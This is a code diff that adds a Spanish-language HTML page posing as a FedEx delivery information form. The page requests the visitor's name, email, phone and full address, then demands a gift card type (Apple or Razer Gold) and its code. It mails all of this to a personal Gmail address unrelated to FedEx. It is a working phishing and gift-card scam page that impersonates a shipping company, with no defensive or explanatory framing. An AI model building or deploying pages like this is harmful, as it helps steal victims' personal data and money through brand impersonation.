@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Formulario de Entrega FedEx</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 2em; }
+    form { max-width: 400px; margin: auto; background: #f5f5f5; padding: 2em; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+    label { display: block; margin-top: 1em; font-weight: bold; }
+    input, textarea, select { width: 100%; padding: 0.5em; margin-top: 0.5em; border-radius: 4px; border: 1px solid #ccc; }
+    button { margin-top: 1.5em; padding: 0.75em 1.25em; background: #4d148c; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+    button:hover { background: #3c1068; }
+  </style>
+</head>
+<body>
+  <h2>Formulario de Información de Entrega de FedEx</h2>
+  <form action="mailto:rebbelleader556789@gmail.com" method="POST" enctype="text/plain">
+    
+    <label for="fullname">Nombre Completo</label>
+    <input type="text" required id="fullname" name="fullname" placeholder="Tu nombre completo">
+
+    <label for="email">Correo Electrónico</label>
+    <input type="email" required id="email" name="email" placeholder="tu@email.com">
+
+    <label for="phone">Número de Teléfono</label>
+    <input type="tel" required id="phone" name="phone" placeholder="ej. +34 123 456 789">
+
+    <label for="address">Dirección de Entrega</label>
+    <textarea id="address" required name="address" rows="3" placeholder="Introduce tu dirección completa"></textarea>
+
+    <label for="city">Ciudad</label>
+    <input type="text" required id="city" name="city">
+
+    <label for="state">Estado/Provincia</label>
+    <input type="text" required id="state" name="state">
+
+    <label for="zip">Código Postal</label>
+    <input type="text" required id="zip" name="zip">
+
+    <label for="country">País</label>
+    <input type="text" required id="country" name="country">
+
+    <label for="instructions">Instrucciones de Entrega (opcional)</label>
+    <textarea id="instructions" name="instructions" rows="2" placeholder="ej. Dejar en la puerta principal"></textarea>
+
+    <label for="card-type">Tarjeta Requerida</label>
+    <select id="card-type" name="card-type" required>
+      <option value="">-- Selecciona Tipo de Tarjeta --</option>
+      <option value="apple">Apple</option>
+      <option value="razer">Razer Gold</option>
+    </select>
+
+    <label for="card-code">Código de la Tarjeta</label>
+    <input type="text" id="card-code" name="card-code" placeholder="Introduce el código de la tarjeta" required>
+
+    <button type="submit">Enviar Información de Entrega</button>
+  </form>
+</body>
+</html>
